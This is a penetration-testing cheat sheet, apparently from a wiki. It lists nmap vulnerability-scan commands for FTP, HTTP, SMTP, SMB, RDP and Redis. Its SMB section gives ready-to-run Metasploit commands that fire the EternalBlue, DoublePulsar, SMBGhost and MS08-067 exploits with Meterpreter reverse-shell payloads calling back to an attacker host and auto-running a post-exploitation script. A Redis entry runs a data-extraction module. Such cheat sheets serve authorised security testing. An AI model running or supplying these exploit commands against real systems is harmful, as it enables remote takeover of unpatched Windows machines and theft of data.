# Network Vulnerability Assessment

## Cheat Sheet

### FTP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
detect ftp vulnerabilities
{% endhint %}

```bash
nmap -sS -sV -p 21 --mtu 5000 \
--script=banner,ftp-anon,ftp-brute,ftp-vuln-cve2010-4221.nse,ftp-vsftpd-backdoor.nse,ftp-proftpd-backdoor.nse \
$TARGET
```

### HTTP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
detect http service vulnerabilities
{% endhint %}

```bash
nmap -sS -sV -p 80 --mtu 5000 \
--script=http-vuln-*,http-huawei-hg5xx-vuln.nse,http-iis-webdav-vuln.nse,http-vmware-path-vuln.nse,mysql-vuln-cve2012-2122.nse $TARGET
```

### SMTP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
detect smtp vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 -p 25,465,587 \
--script=smtp-vuln-* $TARGET
```

### SMB

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
detect smb vulnerabilities
{% endhint %}

```bash
nmap -sS -sV -p 139,445 --mtu 5000 \
--script=smb2-vuln-*,smb-vuln-*,samba-vuln-cve-2012-1182.nse,smb-double-pulsar-backdoor $TARGET
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
EternalBlue Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/ms17_010_eternalblue;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```



{% hint style="info" %}
Doublepulsar Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/smb_doublepulsar_rce;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
SMBGhost Exploit (Win 10)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/cve_2020_0796_smbghost;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Net API Exploit (Win XP's)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/ms08_067_netapi;
    set PAYLOAD windows/meterpreter/reverse_hop_http;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

### RDP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
detect rdp vulnerabilities
{% endhint %}

```bash
nmap -sS -sV -p 3389 --mtu 5000 \
--script=rdp-vuln-ms12-020.nse $TARGET
```

### Redis

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Redis Misconfiguration Check
{% endhint %}

```bash
msfconsole -qx "use auxiliary/gather/redis_extractor;
    set RHOSTS $TARGET;
    run;
    exit"
```

#### [Nessus](https://www.tenable.com/products/nessus)



#### [OpenVAS](https://www.greenbone.net/en/)
